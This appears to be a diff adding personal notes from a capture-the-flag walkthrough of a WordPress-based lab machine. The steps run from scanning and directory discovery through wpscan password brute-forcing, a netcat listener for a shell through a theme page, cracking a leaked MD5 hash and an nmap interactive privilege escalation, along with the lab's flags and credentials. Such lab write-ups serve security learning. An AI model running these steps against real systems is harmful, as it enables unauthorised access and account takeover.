@@ -1,0 +1,78 @@
+1.nmap 192.168.64.192 -sC -sV -A -p- --script=vuln -oN nmap_full.txt
+ -sC  Scan with default NSE scripts. Considered useful for discovery and safe
+ -sV  Attempts to determine the version of the service running on port 
+ -p- for scanning all the ports i.e. from 0 to 65535
+ --script  used for selecting a NSE script.
+ vuln It is a NSE script.
+ -oN used to output the result into a file.
+
+2.nikto -host 192.168.64.192 -o nikto.txt
+
+3.http://192.168.64.192/robots.txt
+
+found 2 directories!
+now we try to open these.
+
+192.168.64.192/fsocity.dic 
+it is a dictionary file.i.e. containing words.
+
+http://192.168.64.192/key-1-of-3.txt
+it contains key hash.i.e. our first flag.
+
+4.Now we do not have any clue,so we will again enumerate more and more.
+use dirbuster for finding common directories in web servers.
+Kkk here we got something 
+http://192.168.64.192/wp-login.php
+This is a wordpress login page.So no we may use wpscan to enumerate more.
+
+wpscan --url http://192.168.64.192  --wp-content-dir wp-content
+
+wpscan --url http://192.168.64.192/wp-login.php -P fsocity_trimmed.txt  -U elliot –threads 50 --wp-content-dir wp-content
+
+wpscan --url http://192.168.64.192/wp-login.php -P fsocity.dic  -U elliot –threads 50 --wp-content-dir wp-content
+
+5.Violla we got password: ER28-0652 for user elliot
+
+6.http://192.168.64.192/wp-content/themes/404.php 
+
+7. nc -lvp -4444 
+	l for listening
+	v for verbose 
+	p for port
+
+8.Boom we got user shell.
+
+9./home/robot
+we got two files 
+key-2-of-3.txt	password.raw-md5
+
+strings key-2-of-3.txt 
+strings: key-2-of-3.txt: Permission denied
+
+strings password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b
+
+chmod 777 key-2-of-3.txt
+chmod: changing permissions of 'key-2-of-3.txt': Operation not permitted
+
+cracked the md5 hash :abcdefghijklmnopqrstuvwxyz
+
+10.
+robot@linux:~$ strings key-2-of-3.txt
+strings key-2-of-3.txt
+822c73956184f694993bede3eb39f959
+
+
+./unix-privesc-check detailed > o.txt
+
+
+11.nmap --interactive
+
+
+  
+ 
+
+
+
+
+
